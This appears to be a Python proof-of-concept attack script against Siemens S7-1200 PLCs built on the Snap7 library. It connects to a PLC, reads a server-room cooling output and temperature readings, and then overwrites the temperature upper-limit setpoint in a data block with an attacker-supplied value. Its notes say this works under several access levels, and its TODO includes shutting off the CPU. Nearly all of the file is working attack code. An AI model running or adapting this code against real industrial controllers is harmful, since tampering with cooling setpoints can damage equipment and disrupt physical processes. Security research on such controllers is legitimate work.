#!/usr/bin/python -tt
# -*- coding: utf-8 -*-
"""
S7-1200 PLC memory attack
2017 Lockout

ATTACK PROOF-OF-CONCEPT CODE
UNSANCTIONED USE FORBIDDEN!

 References:
  1. Snap7: http://snap7.sourceforge.net/
  2. Snap7 Client: http://snap7.sourceforge.net/snap7_client.html
  3. Snap7 1200 notes: http://snap7.sourceforge.net/snap7_client.html#1200_1500
  4. Snap7-Python: http://python-snap7.readthedocs.org/

 Tested against PLC S7-1200 v4.0:
  1. PLC PUT/GET communication has to be enabled for Step7 as described in [3]
  2. When setting the PLC to 'No access' PUT/GET is revoked
  3. Will work against 'Full access', 'Read access', and 'HMI access'

 Depends on:
  1. Snap7
  2. Snap7-Python bindings

 TODO:
  1. Turing off the CPU
  2. Authenticated session access
  3. Partner access
"""

__version__ = "0.2"
import snap7
from snap7.util import *
import sys
import struct
import binascii


def plc_read_db(plc_client, db_no, entry_offset, entry_len):
    """
    Read specified amount of bytes at offset from a DB on a PLC
    """
    try:
        db_var = plc_client.db_read(db_no, entry_offset, entry_len)
    except Exception as err:
        print "[-] DB read error:", err
        sys.exit(1)

    db_val = struct.unpack('!f', binascii.hexlify(db_var).decode('hex'))[0]
    return db_val


def plc_write_db(plc_client, db_no, entry_offset, entry_val):
    """
    Write specified bytes at offset to a DB on a PLC
    """
    db_val = bytearray.fromhex(
        hex(struct.unpack('<I', struct.pack('<f', entry_val))[0])[2:]
        )
    try:
        plc_client.db_write(db_no, entry_offset, db_val)
    except Exception as err:
        print "[-] DB write error:", err
        sys.exit(1)

    return True


def plc_read_mem(plc_client, plc_area, mem_start, mem_len, mem_bit, plc_db=0):
    """
    Read specified amount of bytes at offset from PLC memory area
    """
    try:
        mem_var = plc_client.read_area(plc_area, plc_db, mem_start, mem_len)
    except Exception as err:
        print "[-] Memory read error", err
        sys.exit(1)

    mem_val = get_bool(mem_var, 0, mem_bit)
    return mem_val

if __name__ == "__main__":
    print (
        "S7-1200 ATTACK PROOF-OF-CONCEPT - UNSANCTIONED USE FORBIDDEN!"
        "Version: {0}").format(__version__)
    if len(sys.argv) < 3:
        print (
            "Usage: {0} [PLC IP address] "
            "[Temperature to write]").format(sys.argv[0])
        sys.exit(1)

    # Create a PLC client
    plc = snap7.client.Client()

    # Connect to a PLC
    IP = sys.argv[1]
    # IP = "10.79.6.5"
    rack = 0        # Rack number
    shelf = 1       # Shelf number

    print "Connecting to PLC {0}:102".format(IP)
    try:
        plc.connect(IP, rack, shelf)
    except Exception as err:
        print "[-] Connection failed:", err
        sys.exit(1)

    # Read curent cooling status form Q0.0. True - on, False - off
    area = 0x82     # Q memory area
    start = 0       # Memory offset
    length = 1      # Memory bytes to read
    bit = 0         # Memory bit to read from Q memory byte

    mbyte = plc_read_mem(plc, area, start, length, bit)
    print "[+] Cooling (Q{0}.{1}):".format(start, bit), mbyte

    # Read the current ServerTemperature1
    db = 1          # DB Temperature number
    offset = 0      # Temperature ServerTemperature1 offset
    length = 4      # DB entry length in Bytes, single presion float

    dbval = plc_read_db(plc, db, offset, length)
    print "[+] ServerRoom1 current temperature:", dbval

    # Read the curent temperature UpperLimit
    db = 1          # DB Temperature number
    offset = 8      # Temperature UpperLimit offset
    length = 4      # DB entry length in Bytes, single precision float

    dbval = plc_read_db(plc, db, offset, length)
    print (
        "[+] DB {0} Temperature single-precision "
        "float entry {1} UpperLimit:").format(db, offset), dbval

    # Write temperature UpperLimit - ATTACK!
    # DB write possible for full access, read access, and HMI access
    db = 1
    offset = 8
    setpoint_val = float(sys.argv[2])
    # setpoint_val = 22.22

    plc_write_db(plc, db, offset, setpoint_val)
    print (
        "[!] Writing single-precision float {0} to "
        "DB {1} entry {2}").format(setpoint_val, db, offset)

    plc.disconnect()
    plc.destroy()
    sys.exit(0)
